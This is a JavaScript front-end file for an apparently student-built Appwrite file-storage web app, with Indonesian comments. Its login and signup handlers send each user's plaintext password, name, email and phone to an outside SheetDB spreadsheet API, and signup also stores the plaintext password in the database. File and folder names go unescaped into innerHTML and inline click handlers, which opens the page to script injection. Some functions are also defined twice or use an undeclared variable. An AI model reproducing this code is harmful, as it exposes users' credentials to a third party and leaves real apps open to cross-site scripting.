// ======================================================
// STORAGE TASKS - APP.JS (DESIGN CENTER FIX)
// ======================================================

const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',   
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

let currentUser = null;
let currentFolderId = 'root'; // Menyimpan ID folder yang sedang dibuka

const el = (id) => document.getElementById(id);
const showLoading = () => { if(el('loading')) el('loading').classList.remove('hidden'); };
const hideLoading = () => { if(el('loading')) el('loading').classList.add('hidden'); };

// NAVIGASI
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
        if(el(id)) el(id).classList.add('hidden');
    });
    if(el(pageId)) el(pageId).classList.remove('hidden');
};

// ======================================================
// OTENTIKASI (Login, Signup, Logout)
// ======================================================

// LOGIN
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let identifier = el('loginEmail').value.trim(); 
        const password = el('loginPass').value;
        showLoading();
        try {
            if (!identifier.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', identifier)]);
                if (res.total === 0) throw new Error("Username tidak ditemukan.");
                identifier = res.documents[0].email;
            }
            await account.createEmailPasswordSession(identifier, password);
            currentUser = await account.get();

            fetch(`${SHEETDB_API}?sheet=Login`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": password, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]})
            });

            checkSession(); 
        } catch (error) { alert("Login Gagal: " + error.message); } 
        finally { hideLoading(); }
    });
}

// SIGNUP
if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value;
        const phone = el('regPhone').value; const pass = el('regPass').value;
        if (pass !== el('regVerify').value) return alert("Password tidak sama!");
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
            
            fetch(`${SHEETDB_API}?sheet=SignUp`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString('id-ID') }]})
            });

            alert("Daftar Berhasil!"); nav('loginPage');
        } catch (error) { alert(error.message); } finally { hideLoading(); }
    });
}

// LOGOUT
if (el('logoutBtn')) {
    el('logoutBtn').addEventListener('click', async () => {
        if (!confirm("Keluar?")) return;
        showLoading();
        try {
            const user = await account.get();
            await fetch(`${SHEETDB_API}?sheet=Logout`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": user.$id, "Nama": user.name, "Email": user.email, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]})
            });
            await account.deleteSession('current');
            currentUser = null;
        } catch (e) { console.error(e); }
        finally {
            hideLoading();
            alert("Anda telah logout.");
            nav('loginPage');
        }
    });
}

// ======================================================
// STORAGE LOGIC (RENDER & NAVIGASI FOLDER)
// ======================================================

// === 1. OTENTIKASI & SESI (DIPERTAHANKAN AGAR FOLDER BISA DIBUKA) ===
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        window.nav('dashboardPage'); 
        updateGreeting(); 
        loadFiles('root'); 
    } catch (e) { window.nav('loginPage'); }
    finally { setTimeout(hideLoading, 500); }
}
document.addEventListener('DOMContentLoaded', checkSession);

// === 2. LOGIKA FOLDER & FILE ===
async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid'); 
    if (grid) grid.innerHTML = ''; 

    // Update Area Header / Breadcrumb
    const breadcrumb = document.querySelector('.breadcrumb-area');
    if (breadcrumb) {
        if(folderId !== 'root') {
            // Tampilan saat di dalam folder (Misal folder "p")
            // Memberikan jarak vertikal antara tombol dan judul folder
            breadcrumb.innerHTML = `
                <div class="dynamic-header">
                    <button onclick="loadFiles('root')" class="btn-pill small back-btn">
                        <i class="fa-solid fa-arrow-left"></i> Kembali
                    </button> 
                    <h2 id="headerTitle">${currentFolderName}</h2>
                </div>`;
        } else {
            // Tampilan awal (Root)
            breadcrumb.innerHTML = `<h2 id="headerTitle">Welcome In Drive</h2>`;
            updateGreeting();
        }
    }

    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('parentId', folderId)
        ]);
        
        if(res.documents.length === 0) {
            grid.innerHTML = `<p class="empty-msg">Folder Kosong</p>`;
        } else {
            res.documents.forEach(doc => renderItem(doc));
        }
    } catch (e) { console.error("Gagal memuat folder:", e); }
}

function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div'); 
    div.className = 'item-card'; 
    
    const isFolder = doc.type === 'folder';
    const icon = isFolder ? 'fa-folder' : 'fa-file';
    const fileName = doc.name || doc.nama || "Tanpa Nama";
    
    // Sanitasi nama folder untuk mencegah error saat diklik
    const safeName = fileName.replace(/'/g, "\\'");

    // PERBAIKAN: Mengirim dua parameter (ID dan Nama) agar folder bisa dibuka
    const clickAction = isFolder 
        ? `openFolder('${doc.$id}', '${safeName}')` 
        : `window.open('${doc.url}', '_blank')`;

    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}','${doc.type}','${doc.fileId}')">
            <i class="fa-solid fa-xmark"></i>
        </button>
        <div onclick="${clickAction}" class="item-content">
            <i class="icon fa-solid ${icon}"></i>
            <div class="item-name">${fileName}</div>
        </div>`;
    grid.appendChild(div);
}

// FUNGSI MEMBUKA FOLDER (DIPERBAIKI)
window.openFolder = (id, nama) => { 
    currentFolderId = id; 
    currentFolderName = nama; // Menyimpan nama folder yang diklik (misal: "p")
    loadFiles(id); // Memuat isi folder tersebut
};

// === 3. UTILITAS LAINNYA ===
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
        if(el(id)) el(id).classList.add('hidden');
    });
    if(el(pageId)) el(pageId).classList.remove('hidden');
};

function updateGreeting() {
    const h = new Date().getHours();
    let s = "Morning";
    if(h>=12) s="Afternoon"; if(h>=18) s="Night";
    const title = el('headerTitle');
    if (title && currentFolderId === 'root') title.innerText = `Welcome In Drive ${s}`;
}

// ======================================================
// FITUR MODAL (BUAT FOLDER & UPLOAD)
// ======================================================

window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    closeModal('folderModal'); showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: name, 
            type: 'folder', 
            parentId: currentFolderId, // Folder dibuat di dalam folder yang sedang dibuka
            owner: currentUser.$id, 
            size: 0
        });
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.submitUploadFile = async () => {
    if (!window.selectedFile) return alert("Pilih file!");
    closeModal('uploadModal'); showLoading();
    try {
        const file = window.selectedFile;
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), file);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: file.name, 
            type: 'file', 
            parentId: currentFolderId, // File diupload ke folder yang sedang dibuka
            owner: currentUser.$id, 
            url: url.href, 
            fileId: up.$id, 
            size: file.size
        });
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

// Utils Hapus Item
window.deleteItem = async (id, type, fileId) => {
    if (!confirm("Hapus?")) return;
    showLoading();
    try {
        if (type === 'file') await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, id);
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

// ======================================================
// HELPER UI LAINNYA
// ======================================================
window.openModal = (id) => { el(id).classList.remove('hidden'); el('dropdownMenu').classList.remove('show'); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => openModal('uploadModal');
window.createFolder = () => openModal('folderModal');
window.toggleDropdown = () => el('dropdownMenu').classList.toggle('show');
window.togglePass = (id, icon) => { const i = el(id); i.type = i.type==='password'?'text':'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };
function updateGreeting() { const h = new Date().getHours(); let s = "Morning"; if(h>=12) s="Afternoon"; if(h>=18) s="Night"; if(el('welcomeText')) el('welcomeText').innerText = `Welcome In Drive ${s}`; }

// Drag & Drop Init
el('dropZone').addEventListener('dragover', (e) => { e.preventDefault(); e.target.classList.add('dragover'); });
el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); handleFileSelect(e.dataTransfer.files[0]); });
el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));
